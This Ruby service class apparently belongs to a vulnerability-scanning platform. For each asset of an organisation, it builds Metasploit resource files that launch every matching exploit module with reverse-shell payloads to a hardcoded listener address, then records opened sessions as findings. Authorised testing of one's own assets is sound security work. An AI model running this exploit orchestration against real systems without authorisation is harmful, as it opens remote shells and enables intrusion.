require 'json'
require 'socket'
require 'open3'
require 'tempfile'
require 'timeout'
require 'net/smtp'
require 'thread'

class ScanService
  MSF_BASE = ENV.fetch('MSF_MODULES_PATH', '/usr/share/metasploit-framework/modules/exploits')

  def initialize(org_id, filter_params, user_id, scan = nil, asset_ids = [], scan_options = {})
    @org_id        = org_id
    @filter_params = (filter_params || {}).transform_keys(&:to_s)
    @user_id       = user_id
    @scan          = scan
    @asset_ids     = Array(asset_ids).map(&:to_i).select { |id| id > 0 }
    @scan_options  = scan_options || {}
  end

  def perform
    puts "Starting Scan for Org #{@org_id}..."
    targets = get_targets(@org_id)
    results = []
    threads = []
    mutex = Mutex.new

    targets.each do |target|
      target_ip    = target['ip']
      target_ports = target['ports']
      asset_id     = target['asset_id']

      threads << Thread.new do
        begin
          scan_target_id  = create_scan_target(asset_id)
          target_findings = 0
          target_exploits = 0

          if connect_network(target_ip) == 1
            target_os  = target['os']
            modules    = get_modules_for_target(target_os)
            sev_filter = @filter_params['severities']

            target_ports.each do |port|
              modules.each do |mod|
                severity = read_module_rank(mod[:file])
                next if sev_filter.present? && !sev_filter.include?(severity)

                exploit_record = get_or_create_exploit_record(mod[:path], mod[:file])
                exploit_hash = {
                  'id'                => exploit_record.id,
                  'name'              => exploit_record.name,
                  'metasploit_module' => mod[:path],
                  'severity'          => severity,
                  'default_payload'   => exploit_record.default_payload
                }

                start_ms = (Time.now.to_f * 1000).to_i
                result   = attack(exploit_hash, target_ip, port, target['proxy'])
                elapsed  = (Time.now.to_f * 1000).to_i - start_ms

                target_exploits += 1
                exploit_result = result[:success] ? 'success' : 'failed'
                create_scan_exploit(asset_id, exploit_record.id, exploit_result, elapsed)

                if result[:success]
                  target_findings += 1
                  create_finding(asset_id, exploit_record.id, severity, result[:evidence])
                end

                mutex.synchronize do
                  results << {
                    target:    target_ip,
                    port:      port,
                    exploit:   mod[:path],
                    severity:  severity,
                    success:   result[:success],
                    timestamp: Time.now
                  }
                end
              end
            end

            disconnect_network()
          else
            puts "Could not connect to target #{target_ip}."
          end

          complete_scan_target(scan_target_id, target_exploits, target_findings)
        rescue => e
          puts "Error scanning target #{target_ip}: #{e.message}"
        end
      end
    end

    threads.each(&:join)

    findings_count = results.count { |r| r[:success] }
    critical = results.count { |r| r[:success] && r[:severity]&.downcase == 'critical' }
    high     = results.count { |r| r[:success] && r[:severity]&.downcase == 'high' }
    medium   = results.count { |r| r[:success] && r[:severity]&.downcase == 'medium' }
    low      = results.count { |r| r[:success] && r[:severity]&.downcase == 'low' }

    @scan&.update!(
      status:                'completed',
      end_time:              Time.current,
      total_exploits_tested: results.size,
      findings_count:        findings_count,
      scanned_assets:        targets.size,
      critical_findings:     critical,
      high_findings:         high,
      medium_findings:       medium,
      low_findings:          low
    )

    report_json = result_to_json(results)

    Report.create!(
      organization_id: @org_id,
      user_id:         @user_id,
      generated_by:    @user_id,
      scan_id:         @scan&.id,
      report_name:     "Scan #{Time.current.strftime('%Y-%m-%d %H:%M')}",
      report_type:     'vulnerability',
      report_format:   'json',
      report_data:     results,
      generated_at:    Time.current
    )

    log_results_to_file(report_json, @org_id)
    cleanup_old_logs(7)

    user = User.find_by(id: @user_id)
    if user&.email_address
      send_email(user.email_address, "Scan Report for Org #{@org_id}", report_json)
    else
      puts "No email found for user #{@user_id}"
    end

    puts "Scan complete."
  end

  private

  def connect_network(ip)
    puts "Connecting to network at #{ip}..."
    # Actual connectivity is verified by Metasploit via the configured SOCKS5 proxy.
    return 1
  end

  def disconnect_network
    puts "Disconnecting from network..."
    return 1
  end

  def attack(exploit, target_ip, port, proxy = nil)
    effective_port = @scan_options[:port_override].presence || port
    timeout_secs   = (@scan_options[:timeout].presence || 120).to_i

    rc_file  = Tempfile.new(['aegis_', '.rc'])
    log_file = Tempfile.new(['aegis_out_', '.txt'])

    begin
      rc_file.write(build_resource_file(exploit, target_ip, effective_port, proxy))
      rc_file.flush

      puts "Launching msfconsole for #{target_ip}:#{effective_port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
      pid = Process.spawn(
        'msfconsole', '-q', '--no-readline', '-r', rc_file.path,
        [:out, :err] => log_file.path
      )

      begin
        Timeout.timeout(timeout_secs + 10) { Process.wait(pid) }
      rescue Timeout::Error
        Process.kill('TERM', pid) rescue nil
        Process.wait(pid) rescue nil
      end

      output  = File.read(log_file.path)
      success = output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
      evidence_lines = output.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
      evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
      { success: success, evidence: evidence.presence || (success ? 'Session established' : nil) }
    ensure
      rc_file.close!   rescue nil
      log_file.close!  rescue nil
    end
  rescue => e
    puts "Attack failed: #{e.message}"
    { success: false, evidence: nil }
  end

  def build_resource_file(exploit, target_ip, port, proxy)
    lhost   = ENV.fetch('MSF_LHOST', '100.69.88.107')
    lport   = ENV.fetch('MSF_LPORT', '4444')
    payload = exploit['default_payload'].presence || default_payload_for(exploit)

    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      "set RPORT #{port}",
      "set PAYLOAD #{payload}",
      "set LHOST #{lhost}",
      "set LPORT #{lport}",
      "set ExitOnSession false",
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run -z",
      "sleep 15",
      "sessions -l",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def default_payload_for(exploit)
    mod = exploit['metasploit_module'].to_s
    if    mod.include?('windows') then 'windows/x64/shell/reverse_tcp'
    elsif mod.include?('osx')     then 'osx/x64/shell_reverse_tcp'
    elsif mod.include?('apple')   then 'osx/x64/shell_reverse_tcp'
    else  'linux/x86/shell/reverse_tcp'
    end
  end

  def create_scan_target(asset_id)
    return nil unless @scan&.id && asset_id
    result = ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_targets (scan_id, asset_id, target_status, started_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, 'scanning', NOW()) " \
      "ON CONFLICT (scan_id, asset_id) DO UPDATE SET target_status = 'scanning', started_at = NOW() " \
      "RETURNING id"
    )
    result.first&.fetch('id', nil)
  rescue => e
    puts "Error creating scan_target: #{e.message}"
    nil
  end

  def complete_scan_target(scan_target_id, exploits_tested, findings_count)
    return unless scan_target_id
    ActiveRecord::Base.connection.execute(
      "UPDATE vuln_scanner.scan_targets " \
      "SET target_status = 'completed', completed_at = NOW(), " \
      "exploits_tested = #{exploits_tested.to_i}, findings_count = #{findings_count.to_i} " \
      "WHERE id = #{scan_target_id.to_i}"
    )
  rescue => e
    puts "Error completing scan_target: #{e.message}"
  end

  def create_scan_exploit(asset_id, exploit_id, result, elapsed_ms)
    return unless @scan&.id && asset_id && exploit_id
    safe_result = %w[success failed].include?(result) ? result : 'failed'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_exploits (scan_id, asset_id, exploit_id, result, execution_time_ms, tested_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_result}', #{elapsed_ms.to_i}, NOW())"
    )
  rescue => e
    puts "Error creating scan_exploit: #{e.message}"
  end

  def create_finding(asset_id, exploit_id, severity, evidence)
    return unless @scan&.id && asset_id && exploit_id
    safe_severity = %w[critical high medium low].include?(severity&.downcase) ? severity.downcase : 'medium'
    safe_evidence = ActiveRecord::Base.connection.quote(evidence.to_s)
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, discovered_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, NOW())"
    )
  rescue => e
    puts "Error creating finding: #{e.message}"
  end

  def result_to_json(results_raw)
    JSON.generate(results_raw)
  rescue JSON::GeneratorError => e
    puts "JSON Generation Error: #{e.message}"
  end

  def log_results_to_file(results_json, org_id)
    log_dir = Rails.root.join("logs")
    FileUtils.mkdir_p(log_dir)

    filename = "#{log_dir}/scan_results_org_#{org_id}_#{Time.now.strftime('%Y%m%d_%H%M%S')}.json"
    File.write(filename, results_json)
    puts "Results logged to #{filename}"
  rescue => e
    puts "Failed to log results to file: #{e.message}"
  end

  def cleanup_old_logs(days = 7)
    log_dir = Rails.root.join("logs")
    return unless Dir.exist?(log_dir)

    puts "Cleaning up logs older than #{days} days..."
    cutoff_time = Time.now - (days * 24 * 60 * 60)

    Dir.glob("#{log_dir}/*.json").each do |file|
      begin
        if File.mtime(file) < cutoff_time
          File.delete(file)
          puts "Deleted old log: #{file}"
        end
      rescue => e
        puts "Failed to delete #{file}: #{e.message}"
      end
    end
  end

  def get_modules_for_target(target_os)
    platform = @filter_params['platform'].presence || target_os
    dirs     = platform_dirs(platform)
    files    = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{MSF_BASE}/#{d}/**/*.rb") }
                         : Dir.glob("#{MSF_BASE}/**/*.rb")
    files.uniq.map { |f| { path: 'exploit/' + f.sub("#{MSF_BASE}/", '').sub('.rb', ''), file: f } }
  end

  def platform_dirs(platform)
    case platform&.downcase
    when 'windows' then %w[windows multi]
    when 'linux'   then %w[linux unix multi]
    when 'macos'   then %w[osx apple_ios multi]
    else []
    end
  end

  def read_module_rank(file_path)
    content = File.read(file_path) rescue ''
    rank    = content.match(/\bRank\s*=\s*(\w+)/i)&.[](1).to_s.downcase
    case rank
    when /excellent|great/ then 'critical'
    when /good/            then 'high'
    when /normal|average/  then 'medium'
    else                        'low'
    end
  end

  def get_or_create_exploit_record(module_path, file_path)
    Exploit.find_or_create_by!(exploit_id: module_path) do |e|
      e.name              = module_path.split('/').last.tr('_', ' ').split.map(&:capitalize).join(' ')
      e.severity          = read_module_rank(file_path)
      e.metasploit_module = module_path
    end
  rescue ActiveRecord::RecordNotUnique
    Exploit.find_by!(exploit_id: module_path)
  end

  def get_targets(org_id)
    condition = @asset_ids.any? ? "AND id IN (#{@asset_ids.map(&:to_i).join(',')})" : ""
    result = ActiveRecord::Base.connection.select_all(
      "SELECT id, ip_address, scan_config FROM assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
    )
    targets = []
    result.each do |row|
      config = JSON.parse(row['scan_config'] || '{}') rescue {}
      port   = parse_port(config['port'])
      ip     = row['ip_address'].to_s
      proxy = if @scan_options[:use_agent] == false
        nil
      else
        agent = Agent.find_for_target(org_id, ip)
        agent ? "socks5:127.0.0.1:#{agent.tunnel_port}" : nil
      end
      puts proxy ? "Routing #{ip} via agent proxy #{proxy}" : "Scanning #{ip} directly (no agent)"
      targets << { 'ip' => ip, 'asset_id' => row['id'].to_i, 'ports' => [port], 'proxy' => proxy, 'os' => config['os'] }
    end
    targets
  rescue => e
    puts "Error fetching targets: #{e.message}"
    []
  end

  def parse_port(port_str)
    return rand(1..1024) if port_str.blank?

    str = port_str.to_s.strip

    # Range: "8000-8080"
    if str =~ /\A(\d+)-(\d+)\z/
      lo, hi = $1.to_i, $2.to_i
      return rand(lo..hi) if lo >= 1 && hi <= 65535 && lo <= hi
    end

    # Comma-separated or single: "80, 443" — use first valid
    ports = str.split(',').map { |p| p.strip.to_i }.select { |p| p >= 1 && p <= 65535 }
    return ports.first unless ports.empty?

    rand(1..1024)
  end

  def send_email(to_email, subject, body)
    from_email = ENV.fetch('SMTP_FROM', 'scanner@example.com')
    smtp_host  = ENV.fetch('SMTP_HOST', 'localhost')
    smtp_port  = ENV.fetch('SMTP_PORT', '25').to_i

    msg = <<~END_OF_MESSAGE
      From: #{from_email}
      To: #{to_email}
      Subject: #{subject}
      MIME-Version: 1.0
      Content-Type: text/plain; charset=utf-8

      #{body}
    END_OF_MESSAGE

    begin
      Net::SMTP.start(smtp_host, smtp_port) do |smtp|
        smtp.send_message msg, from_email, to_email
      end
      puts "Email sent to #{to_email}"
    rescue => e
      puts "Failed to send email: #{e.message}"
    end
  end
end
